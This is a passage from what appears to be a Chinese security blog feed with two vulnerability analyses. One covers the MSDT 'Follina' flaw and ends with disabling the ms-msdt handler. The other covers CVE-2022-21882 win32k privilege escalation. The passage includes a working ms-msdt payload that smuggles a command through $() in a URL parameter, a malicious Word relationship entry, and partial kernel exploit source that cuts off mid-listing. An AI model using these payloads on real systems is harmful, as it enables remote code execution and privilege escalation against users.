id="TS-ProgramCompatibilityWizard-ps1"><a href="#TS-ProgramCompatibilityWizard-ps1" class="headerlink" title="TS_ProgramCompatibilityWizard.ps1"></a>TS_ProgramCompatibilityWizard.ps1</h4><p>Get-DiagInput用于从用户获取输入的信息，获取传入的IT_BrowseForFile参数，并赋值给$selectedProgram变量。</p><pre class="line-numbers language-none"><code class="language-none">if(-not($ChoicesAvailable)){    $selectedProgram = Get-DiagInput -id IT_BrowseForFile}else{    $selectedProgram = Get-DiagInput -id IT_SelectProgram -choice $choices## If the user chose the option "Not listed" we will ask them to browse for a file    if($selectedProgram -eq "NotListed")    {        $selectedProgram = Get-DiagInput -id IT_BrowseForFile    }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>调用Test-Selection方法对$selectedProgram进行检测。使用test_path命令来对路径进行检测，确保路径存在，对于/../返回到根路径之外的路径返回True，要求路径的扩展名为exe和msi。</p><pre class="line-numbers language-none"><code class="language-none">function Test-Selection([string]$appPath){    $testresult = $false    if(($appPath -ne $null) -and -not([String]::IsNullOrEmpty($appPath)))    {        $testresult = test-path -literalpath $appPath        if($testresult)        {            if(-not($type::IsFileProtected($appPath)))            {                $extension = [System.IO.Path]::GetExtension($appPath)                $testresult = ($extension -eq ".exe") -or ($extension -eq ".msi")            }            else            {                $testresult = $false                Set-Variable -name rebrowseText -value $CompatibilityStrings.Text_FILE_PROTECTED -scope global            }        }    }    Set-Variable -name appValid -value $testResult -scope global}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>从$selectedProgram提取文件名，过滤$符号，防止代码注入。由于脚本直接使用$,$实际会在过滤前被PowerShell引擎解析，所以无法起到过滤$字符的作用。</p><p>正确写法应为 $appName = [System.IO.Path]::GetFileNameWithoutExtension($selectedProgram).Replace(“`$”, “``$”)</p><pre class="line-numbers language-none"><code class="language-none">while(-not($appValid)){    $InstanceId++    $selection = $selectedProgram    $selectedProgram = Get-DiagInput -id IT_RebrowseForFile -parameter @{ "SelectedProgram" = $selection; "RebrowseText" = $rebrowseText; "Instance" = $InstanceId }    Set-Variable -name rebrowseText -value $CompatibilityStrings.Text_FILE_INVALID -scope global    Test-Selection($selectedProgram)}$appName = [System.IO.Path]::GetFileNameWithoutExtension($selectedProgram).Replace("$", "`$")<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>TS最后使用Update-DiagRootCause命令，用于报告root cause的状态。会触发RS_脚本，parameter指定的字典会被作为参数传给脚本，导致第二次调用RunScript()方法，并且参数中-TargetPath可控，进而触发了漏洞。</p><pre class="line-numbers language-none"><code class="language-none">if ($UpdateChoice -eq "ts_Manual"){    $Env:RecommendedLayer = $AppInfo[2]    Update-DiagRootCause -id "RC_IncompatibleApplication" -iid $appName -Detected $true -parameter @{ "TARGETPATH" = $selectedProgram; "APPNAME" = $appName}}else{    Start-Process -FilePath $AppInfo[1]}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02 漏洞利用"></a>0x02 漏洞利用</h2><p>1.新建word文档，后缀更改为zip，打开后编辑/word/_regs目录下的document.xml.rels按照格式加入。</p><pre class="line-numbers language-none"><code class="language-none">&lt;Relationship  Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObje ct" Target="mhtml:http://localhost:80/exploit.html!x-usc:http://localhost:80/exploit.html" TargetMode="External"/&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2.建一个文件夹作为web站点目录，新建exploit.html文件添加（弹计算器）</p><pre class="line-numbers language-none"><code class="language-none">&lt;script&gt;location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \"IT_RebrowseForFile=?IT_LaunchMethod=ContextMenu IT_BrowseForFile=/../../$(\\\\localhost\\c$\\windows\\system32\\calc)/.exe\"";&lt;script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>IT_RebrowseForFile参数开头至少需要两次/../目录遍历</p><p>包含$()中的代码会通过PowerShell执行</p><p>.exe必须是IT_BrowseForFile参数末尾的最后一个字符串</p><h2 id="0x03-漏洞修复"><a href="#0x03-漏洞修复" class="headerlink" title="0x03 漏洞修复"></a>0x03 漏洞修复</h2><p><strong>缓解方法：</strong></p><p>1.禁用MSDT URL协议阻止使用漏洞的恶意攻击。</p><p>2.禁用MSDT URL协议可防止故障排除应用程序作为链接启动，包括整个操作系统的链接。</p><p><strong>禁用方法：</strong></p><p>1.以管理员身份运行命令提示符</p><p>2.备份注册表项，执行命令<code>reg export HKEY_CLASSES_ROOT\ms-msdt [filename]</code></p><p>3.执行命令<code>reg delete HKEY_CLASSES_ROOT\ms-msdt</code></p><p><strong>撤销禁用：</strong></p><p>1.以管理员身份运行命令提示符</p><p>2.恢复注册表项，执行命令“reg import [filename]”</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2022-21882 win32k内核提权分析</title>
      <link href="/2023/03/07/CVE-2022-21882%20win32k%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/"/>
      <url>/2023/03/07/CVE-2022-21882%20win32k%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00漏洞描述"><a href="#0x00漏洞描述" class="headerlink" title="0x00漏洞描述"></a>0x00漏洞描述</h2><p>CVE-2022-21882漏洞是window系统的一个本地提权漏洞，微软在2022年1月份安全更新中修补了此漏洞。CVE-2022-21882是对CVE-2021-1732漏洞的绕过，属于win32k驱动程序中的类型混淆漏洞。漏洞成因与CVE-2021-1732类似，主要因为win32kfull!xxxClientAllocExtraBytes函数会回调用户空间中的user32!xxxClientAllocWindowClassExtraBytes,使用NtUserConsoleControl方法设置tagWNDK对象的ConsoleWindow标志，修改窗口类型。回调之后，系统不检查窗口类型是否改变，攻击者可以设置目标窗口的ExtraBytes指针为任意值，修改寻址方式为桌面堆+偏移，以实现桌面堆的越界写。</p><p>影响版本：</p><pre class="line-numbers language-none"><code class="language-none">Windows 10 Version 21H2 for x64-based SystemsWindows 10 Version 21H2 for ARM64-based SystemsWindows 10 Version 21H2 for 32-bit SystemsWindows 11 for ARM64-based SystemsWindows 11 for x64-based SystemsWindows Server, version 20H2 (Server Core Installation)Windows 10 Version 20H2 for ARM64-based SystemsWindows 10 Version 20H2 for 32-bit SystemsWindows 10 Version 21H1 for ARM64-based SystemsWindows 10 Version 21H1 for x64-based SystemsWindows 10 Version 1909 for x64-based SystemsWindows 10 Version 1909 for 32-bit SystemsWindows Server 2019 (Server Core installation)Windows Server 2019Windows 10 Version 1809 for ARM64-based SystemsWindows 10 Version 1809 for x64-based SystemsWindows 10 Version 1809 for 32-bit SystemsWindows 10 Version 20H2 for x64-based SystemsWindows 10 Version 1909 for ARM64-based SystemsWindows Server 2022 (Server Core installation)Windows Server 2022Windows 10 Version 21H1 for 32-bit Systems<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="0x01漏洞分析"><a href="#0x01漏洞分析" class="headerlink" title="0x01漏洞分析"></a>0x01漏洞分析</h2><h3 id="CVE-2021-1732补丁"><a href="#CVE-2021-1732补丁" class="headerlink" title="CVE-2021-1732补丁"></a>CVE-2021-1732补丁</h3><p>CVE-2021-1732的补丁是在CreateWindowEx在调用ClientAllocWindowClassExtraBytes后增加了一个检查。正常情况下在新创建一个窗口还没有调用xxxClientAllocWindowClassExtraBytes的时候，其窗口对应的tagWND -&gt; ExtraBytes是空的，通过检测目标窗口的ExtraBytes指针是否在回调过程中被修改，推测用户态回调是否被hook，如果检查到非正常修改就会释放新创建的窗口，返回失败。也就是说CVE-2021-1732的补丁打在CreateWindowEx，修复方法是在调用xxxClientAllocWindowClassExtraBytes函数后，在CreateWindowEx中判断漏洞是否被利用。</p><p><img src="/2023/03/07/CVE-2022-21882%20win32k%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/image-20220815112448042.png"></p><p>但是xxxCreateAllocWindowClassExtraBytes函数并没有做任何修改。打完补丁之后，又出现的新的路径来触发xxxClientAllocWindowClassExtraBytes函数。</p><h3 id="win32kfull-xxxSwitchWndProc"><a href="#win32kfull-xxxSwitchWndProc" class="headerlink" title="win32kfull!xxxSwitchWndProc"></a>win32kfull!xxxSwitchWndProc</h3><p>xxxSwitchWndProc函数中调用xxxClientAllocWindowClassExtraBytes为窗口分配额外内存，后面却没有检查窗口的ExtraBytes在用户层回调过程中是否修改，因此发生了和CVE-2021-1732同样的问题，由于窗口已经创建完毕，窗口的句柄也更容易拿到，因此漏洞更容易利用。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">_int64 __fastcall <span class="token function">xxxSwitchWndProc</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">tagWND</span> <span class="token operator">*</span>a1<span class="token punctuation">,</span> <span class="token keyword">int</span> a2<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> __int64 a3<span class="token punctuation">,</span> __int64 a4<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>v7 <span class="token operator">+</span> <span class="token number">0x23</span><span class="token punctuation">)</span> <span class="token operator">=</span> v15<span class="token punctuation">;</span>    <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>v8 <span class="token operator">+</span> <span class="token number">0xFC</span>i64<span class="token punctuation">)</span> <span class="token operator">=</span> v14<span class="token punctuation">;</span>    cbExtraBytes <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>v8 <span class="token operator">+</span> <span class="token number">0xC8</span>i64<span class="token punctuation">)</span><span class="token punctuation">;</span>    v28 <span class="token operator">=</span> cbExtraBytes<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>_DWORD<span class="token punctuation">)</span>cbExtraBytes <span class="token punctuation">)</span><span class="token comment">//cbExtraBytes大于0，调用xxxClientAllocWindowClassExtraBytes</span>    <span class="token punctuation">{</span>        ret <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">xxxClientAllocWindowClassExtraBytes</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>cbExtraBytes<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>ret <span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token number">0</span>i64<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span>    <span class="token punctuation">{</span>        ret <span class="token operator">=</span> <span class="token number">0</span>i64<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> tagWND<span class="token operator">::</span>RedirectedFieldpExtraBytes<span class="token operator">::</span>operator<span class="token operator">&lt;</span>bool<span class="token operator">&gt;</span> <span class="token function">bool</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span>v7 <span class="token operator">+</span> <span class="token number">0x140</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token comment">// tagWND-&gt;ExtraBytes != NULL</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> ret <span class="token punctuation">)</span>            <span class="token function">memmove</span><span class="token punctuation">(</span>            ret<span class="token punctuation">,</span>            <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>v8 <span class="token operator">+</span> <span class="token number">0x128</span>i64<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>v8 <span class="token operator">+</span> <span class="token number">0xFC</span>i64<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            cbExtraBytes<span class="token punctuation">)</span><span class="token punctuation">;</span>        tagWND <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>v7 <span class="token operator">+</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ExtraBytes <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>tagWND <span class="token operator">+</span> <span class="token number">0x128</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>tagWND <span class="token operator">+</span> <span class="token number">0x128</span><span class="token punctuation">)</span> <span class="token operator">=</span> ret<span class="token punctuation">;</span>        <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>v7 <span class="token operator">+</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0xC8</span>i64<span class="token punctuation">)</span> <span class="token operator">=</span> cbExtraBytes<span class="token punctuation">;</span>        <span class="token function">xxxClientFreeWindowClassExtraBytes</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span>v7<span class="token punctuation">,</span> ExtraBytes<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02 漏洞利用"></a>0x02 漏洞利用</h2><h3 id="利用流程"><a href="#利用流程" class="headerlink" title="利用流程"></a>利用流程</h3><p><img src="/2023/03/07/CVE-2022-21882%20win32k%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/image-20220815162914670.png"></p><p>应用层可以通过调用NtUserMessageCall函数触发内核层的xxxSwitchWndProc函数，接着就会调用到xxxClientAllocWindowClassExtraBytes。事先在应用层hook相应的回调函数，然后调用函数NtUserConsoleControl修改tagWND_Trigger的ExtraBytes内存寻址方式为桌面堆+偏移，调用NtCallbackReturn将窗口相对桌面堆的偏移tagWND_Victim offset设置为tagWND_Trigger - &gt; ExtraBytes，Hook应用层的User32!xxxClientFreeWindowClassExtraBytes,使其不释放tagWND_Trigger -&gt; ExtraBytes。</p><p>触发漏洞窗口hTrigger和受害者窗口hVictim在内存上的布局：按照利用流程修改hTrigger的tagWND-&gt;Flags |= 0x800,设置tagWND_Victim相对与桌面堆的偏移为Trigger-&gt;ExtraBytes,然后对hWndTrigger调用SetWindowLong系列函数，越界修改Victim-&gt;ExtraBytes为任意内存，再对hWndVictim调用SetWindowLong系列函数任意内存写，获得任意内核地址写之后，修改当前进程的Token -&gt; Privileges,最后恢复Victim -&gt; ExtraBytes和Trigger -&gt; Flags，避免BSOD。</p><h3 id="EXP分析"><a href="#EXP分析" class="headerlink" title="EXP分析"></a>EXP分析</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c">##include<span class="token operator">&lt;</span>windows<span class="token punctuation">.</span>h<span class="token operator">&gt;</span>##include<span class="token operator">&lt;</span>stdio<span class="token punctuation">.</span>h<span class="token operator">&gt;</span>##include<span class="token operator">&lt;</span>stdlib<span class="token punctuation">.</span>h<span class="token operator">&gt;</span>##include <span class="token operator">&lt;</span>Psapi<span class="token punctuation">.</span>h<span class="token operator">&gt;</span>##pragma <span class="token function">comment</span><span class="token punctuation">(</span>lib<span class="token punctuation">,</span> <span class="token string">"Psapi.lib "</span><span class="token punctuation">)</span>##define KERNEL_CALLBACK_TABLE_OFFSET <span class="token number">0x58</span>##define TRIGGERWND_EXTRASIZE <span class="token number">0xABCD</span>##define <span class="token function">STATUS_INFO_LENGTH_MISMATCH</span>  <span class="token punctuation">(</span><span class="token punctuation">(</span>NTSTATUS<span class="token punctuation">)</span><span class="token number">0xC0000004L</span><span class="token punctuation">)</span> ##pragma <span class="token function">pack</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token punctuation">{</span>    ULONG64 hWnd<span class="token punctuation">;</span>                <span class="token comment">// + 0x00</span>    ULONG64 OffsetToDesktopHeap<span class="token punctuation">;</span> <span class="token comment">// + 0x08</span>    ULONG64 state<span class="token punctuation">;</span>               <span class="token comment">// + 0x10</span>    DWORD dwExStyle<span class="token punctuation">;</span>             <span class="token comment">// + 0x18</span>    DWORD dwStyle<span class="token punctuation">;</span>               <span class="token comment">// + 0x1C</span>    BYTE padd1<span class="token punctuation">[</span><span class="token number">0xa8</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    ULONG64 cbWndExtra<span class="token punctuation">;</span>          <span class="token comment">// + 0xC8</span>    BYTE padd2<span class="token punctuation">[</span><span class="token number">0x18</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    DWORD dwExtraFlag<span class="token punctuation">;</span>           <span class="token comment">// + 0xE8</span>    BYTE padd3<span class="token punctuation">[</span><span class="token number">0x3c</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    ULONG64 pExtraBytes<span class="token punctuation">;</span>         <span class="token comment">// + 0x128</span><span class="token punctuation">}</span>tagWNDK<span class="token punctuation">,</span><span class="token operator">*</span>PWND<span class="token punctuation">;</span>##pragma <span class="token function">pack</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_SYSTEM_HANDLE</span><span class="token punctuation">{</span>    PVOID Object<span class="token punctuation">;</span>    HANDLE UniqueProcessId<span class="token punctuation">;</span>    HANDLE HandleValue<span class="token punctuation">;</span>    ULONG GrantedAccess<span class="token punctuation">;</span>    USHORT CreatorBackTraceIndex<span class="token punctuation">;</span>    USHORT ObjectTypeIndex<span class="token punctuation">;</span>    ULONG HandleAttributes<span class="token punctuation">;</span>    ULONG Reserved<span class="token punctuation">;</span><span class="token punctuation">}</span> SYSTEM_HANDLE<span class="token punctuation">,</span> <span class="token operator">*</span> PSYSTEM_HANDLE<span class="token punctuation">;</span><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_SYSTEM_HANDLE_INFORMATION_EX</span><span class="token punctuation">{</span>    ULONG_PTR HandleCount<span class="token punctuation">;</span>    ULONG_PTR Reserved<span class="token punctuation">;</span>    SYSTEM_HANDLE Handles<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span> SYSTEM_HANDLE_INFORMATION_EX<span class="token punctuation">,</span> <span class="token operator">*</span> PSYSTEM_HANDLE_INFORMATION_EX<span class="token punctuation">;</span><span class="token keyword">enum</span> <span class="token class-name">SYSTEM_INFORMATION_CLASS</span> <span class="token punctuation">{</span>    SystemExtendedHandleInformation <span class="token operator">=</span> <span class="token number">64</span><span class="token punctuation">}</span><span class="token punctuation">;</span>using NtUserMessageCall_t <span class="token operator">=</span> <span class="token function">NTSTATUS</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>    HWND hWnd<span class="token punctuation">,</span>    UINT Msg<span class="token punctuation">,</span>    WPARAM wParam<span class="token punctuation">,</span>    LPARAM lParam<span class="token punctuation">,</span>    ULONG_PTR ResultInfo<span class="token punctuation">,</span>    DWORD dwType<span class="token punctuation">,</span>    BOOL bAnsi<span class="token punctuation">)</span><span class="token punctuation">;</span>using ZwQuerySystemInformation_t <span class="token operator">=</span> <span class="token function">NTSTATUS</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>    SYSTEM_INFORMATION_CLASS SystemInformationClass<span class="token punctuation">,</span>    PVOID SystemInformation<span class="token punctuation">,</span>    ULONG SystemInformationLength<span class="token punctuation">,</span>    PULONG ReturnLength<span class="token punctuation">)</span><span class="token punctuation">;</span>using RtlAllocateHeap_t <span class="token operator">=</span> <span class="token function">PVOID</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>PVOID HeapHandle<span class="token punctuation">,</span> ULONG Flags<span class="token punctuation">,</span> SIZE_T Size<span class="token punctuation">)</span><span class="token punctuation">;</span>using <span class="token class-name">xxxClientAllocWindowClassExtraBytes_t</span> <span class="token operator">=</span> <span class="token function">NTSTATUS</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>PDWORD Length<span class="token punctuation">)</span><span class="token punctuation">;</span>using <span class="token class-name">xxxClientFreeWindowClassExtraBytes_t</span> <span class="token operator">=</span> <span class="token function">NTSTATUS</span><span class="token punctuation">(</span><span class="token operator">*</span>WINAPI<span class="token punctuation">)</span><span class="token punctuation">(</span>PVOID<span class="token operator">*</span> pInfo<span class="token punctuation">)</span><span class="token punctuation">;</span>using NtUserConsoleControl_t <span class="token operator">=</span> <span class="token function">NTSTATUS</span><span class="token punctuation">(</span>__fastcall<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>DWORD64<span class="token punctuation">,</span> LPVOID<span class="token punctuation">,</span> DWORD<span class="token punctuation">)</span><span class="token punctuation">;</span>using NtCallbackReturn_t <span class="token operator">=</span> <span class="token function">NTSTATUS</span><span class="token punctuation">(</span>__fastcall<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>LPVOID<span class="token punctuation">,</span> DWORD<span class="token punctuation">,</span> NTSTATUS<span class="token punctuation">)</span><span class="token punctuation">;</span>using HMValidateHandle_t <span class="token operator">=</span> tagWNDK<span class="token operator">*</span><span class="token punctuation">(</span>__fastcall<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>HANDLE<span class="token punctuation">,</span> UINT<span class="token punctuation">)</span><span class="token punctuation">;</span>using IsMenu_t <span class="token operator">=</span> <span class="token function">BOOL</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>HMENU hMenu<span class="token punctuation">)</span><span class="token punctuation">;</span>namespace gb <span class="token punctuation">{</span>    <span class="token class-name">xxxClientAllocWindowClassExtraBytes_t</span> xxxClientAllocWindowClassExtraBytes <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token class-name">xxxClientFreeWindowClassExtraBytes_t</span> xxxClientFreeWindowClassExtraBytes <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    NtUserConsoleControl_t NtUserConsoleControl <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    NtCallbackReturn_t NtCallbackReturn <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    HMValidateHandle_t HMValidateHandle <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    NtUserMessageCall_t  NtUserMessageCall <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    ZwQuerySystemInformation_t ZwQuerySystemInformation <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    RtlAllocateHeap_t RtlAllocateHeap <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    IsMenu_t u32_IsMenu <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    HMODULE g_hNtdll <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    HMODULE g_hWin32u <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    HMODULE g_hUser32 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    HWND g_hTriggerWnd <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    HWND g_hVictimWnd <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    DWORD64 TriggerDeskHeap <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    DWORD64 VictimDeskHeap <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    HANDLE hToken <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span>VOID <span class="token function">SetFuncHook</span><span class="token punctuation">(</span>DWORD64 newAllocFunc<span class="token punctuation">,</span>DWORD64 newFreeFunc<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment">//1.获取本进程的PEB</span>    DWORD64 ulCurrPEB <span class="token operator">=</span> <span class="token function">__readgsqword</span><span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] Found ulCurrPEB = 0x%p\n"</span><span class="token punctuation">,</span> ulCurrPEB<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//2.找到KernelCallbackTable</span>    DWORD64 KernelCallbackTable <span class="token operator">=</span> ulCurrPEB <span class="token operator">+</span> KERNEL_CALLBACK_TABLE_OFFSET<span class="token punctuation">;</span>    KernelCallbackTable <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>PDWORD64<span class="token punctuation">)</span>KernelCallbackTable<span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] Found KernelCallbackTable = 0x%p\n"</span><span class="token punctuation">,</span> KernelCallbackTable<span class="token punctuation">)</span><span class="token punctuation">;</span>    DWORD64  xxxClientAllocExtraBytesFunc <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>PDWORD64<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span>KernelCallbackTable <span class="token operator">+</span> <span class="token number">0x7B</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] Found xxxClientAllocExtraBytesFunc = 0x%p\n"</span><span class="token punctuation">,</span> xxxClientAllocExtraBytesFunc<span class="token punctuation">)</span><span class="token punctuation">;</span>    gb<span class="token operator">::</span>xxxClientAllocWindowClassExtraBytes <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">xxxClientAllocWindowClassExtraBytes_t</span><span class="token punctuation">)</span>xxxClientAllocExtraBytesFunc<span class="token punctuation">;</span>    DWORD64  xxxClientFreeExtraBytesFunc <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>PDWORD64<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span>KernelCallbackTable <span class="token operator">+</span> <span class="token number">0x7C</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] Found xxxClientFreeExtraBytesFunc = 0x%p\n"</span><span class="token punctuation">,</span> xxxClientFreeExtraBytesFunc<span class="token punctuation">)</span><span class="token punctuation">;</span>    gb<span class="token operator">::</span>xxxClientFreeWindowClassExtraBytes <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">xxxClientFreeWindowClassExtraBytes_t</span><span class="token punctuation">)</span>xxxClientFreeExtraBytesFunc<span class="token punctuation">;</span>    <span class="token comment">//3.HOOK</span>    <span class="token comment">//首先需要设置页面可写属性</span>    DWORD dwOldProtect<span class="token punctuation">;</span>    <span class="token function">VirtualProtect</span><span class="token 